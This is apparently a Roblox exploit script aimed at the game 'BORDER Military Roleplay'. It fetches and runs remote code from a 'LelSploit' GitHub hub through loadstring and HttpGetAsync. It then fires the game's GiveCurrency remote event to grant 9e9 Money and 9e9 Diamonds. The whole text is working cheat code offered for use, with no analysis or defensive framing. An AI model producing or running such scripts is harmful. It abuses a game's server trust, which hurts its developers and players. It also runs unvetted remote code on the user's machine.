local Hub = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Leofreddare/LelSploit/main/LelHub/u.luau"))()("BORDER Military Roleplay")
local LelUI = Hub.Native
local Instance = LelUI.Instance
task.spawn(function()
game:GetService("ReplicatedStorage").Configuration["Core Systems"].Datastore.GiveCurrency:FireServer({Type = "Money",Amount = 9e9})
game:GetService("ReplicatedStorage").Configuration["Core Systems"].Datastore.GiveCurrency:FireServer({Type = "Diamond",Amount = 9e9})

end)
